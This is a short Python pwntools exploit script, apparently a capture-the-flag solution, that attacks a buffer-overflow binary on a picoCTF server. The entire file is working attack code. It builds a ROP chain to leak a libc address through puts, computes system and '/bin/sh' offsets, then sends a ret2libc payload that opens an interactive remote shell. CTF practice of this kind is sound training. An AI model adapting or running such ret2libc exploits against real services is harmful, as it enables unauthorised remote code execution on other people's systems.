#!usr/bin/env/python3

from pwn import *

#offset = 136


# context.log_level = "debug"
elf = context.binary = ELF("./vuln")


pop_rdi = p64(0x000000400913)
setbuf_got = p64(0x000000601028)
puts_plt = p64(0x400540)
main_ret = p64(elf.symbols['main'])


buffer = b"A"* 136
buffer += pop_rdi
buffer += setbuf_got
buffer += puts_plt
buffer += main_ret

# p = elf.process()
p = remote("mercury.picoctf.net",1774)
# p = gdb.debug(elf.path,''' b *do_stuff ''')
print(p.recvline())
p.sendline(buffer)
print(p.recvline())



leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print(hex(leak))
libc_base = leak - 0x88540


system = libc_base + 0x0000000004f4e0
bin_sh = libc_base + 1786106

print(f"LIBC_BASE = {hex(libc_base)}")
print(f"SYSTEM ADDR = {hex(system)}")
print(f"BIN SH = {hex(bin_sh)}")

# FInal payload

exp = b"A" * 136
exp += pop_rdi
exp += p64(bin_sh)
exp += p64(0x000000000040052e) #RET
exp += p64(system)

p.recvline()
p.sendline(exp)
p.interactive()
